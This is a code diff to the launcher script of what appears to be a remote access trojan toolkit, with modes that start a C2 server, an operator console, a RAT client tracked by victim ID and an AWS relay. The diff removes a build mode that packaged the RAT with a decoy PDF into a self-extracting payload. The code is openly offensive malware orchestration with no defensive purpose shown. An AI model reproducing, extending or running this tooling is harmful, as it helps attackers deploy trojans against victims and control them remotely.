@@ -15,9 +15,9 @@ def start_c2():
 
 
 def start_decoder(victim_id, c2_url):
-    """Start the QR Decoder client."""
+    """Start the QR Decoder client (unified into rat_client.py)."""
     print(f"[*] Starting QR Decoder for victim: {victim_id}")
-    os.system(f"python qr_decoder.py --c2 {c2_url} --victim-id {victim_id} --interval 5")
+    os.system(f"python rat_client.py --c2 {c2_url} --victim-id {victim_id} --interval 5")
 
 
 def start_operator(c2_url):
@@ -38,10 +38,7 @@ def start_aws_relay(c2_backend):
     os.system(f"python aws_relay.py --c2 {c2_backend}")
 
 
-def build_payload(rat_path, decoy_path, c2_host, c2_port):
-    """Build SFX payload."""
-    print("[*] Building SFX Payload...")
-    os.system(f"python sfx_payload.py --rat {rat_path} --decoy {decoy_path} --c2-host {c2_host} --c2-port {c2_port}")
+ 
 
 
 def run_tests():
@@ -51,8 +48,7 @@ def run_tests():
 
 
 def print_banner():
-    print("""
-   ____      _                  ____                      
+    print(r"""
   / ___|   _| |__   ___ _ __   |  _ \ ___  ___ ___  _ __  
  | |  | | | | '_ \ / _ \ '__|  | |_) / _ \/ __/ _ \| '_ \ 
  | |__| |_| | |_) |  __/ |     |  _ <  __/ (_| (_) | | | |
@@ -82,7 +78,7 @@ Examples:
     )
 
     parser.add_argument("--mode", required=True,
-                        choices=["c2", "operator", "decoder", "rat", "relay", "build", "test"],
+                        choices=["c2", "operator", "decoder", "rat", "relay", "test"],
                         help="Component to launch")
     parser.add_argument("--c2-url", default="http://127.0.0.1:8443",
                         help="C2 server URL")
@@ -92,10 +88,7 @@ Examples:
                         help="C2 server port")
     parser.add_argument("--victim-id",
                         help="Victim ID for decoder mode")
-    parser.add_argument("--rat-path", default="rat_client.py",
-                        help="Path to RAT script for build mode")
-    parser.add_argument("--decoy-path", default="decoy.pdf",
-                        help="Path to decoy PDF for build mode")
+   
 
     args = parser.parse_args()
 
@@ -114,8 +107,7 @@ Examples:
         start_rat(args.c2_host, args.c2_port)
     elif args.mode == "relay":
         start_aws_relay(args.c2_url)
-    elif args.mode == "build":
-        build_payload(args.rat_path, args.decoy_path, args.c2_host, args.c2_port)
+    
     elif args.mode == "test":
         run_tests()
 
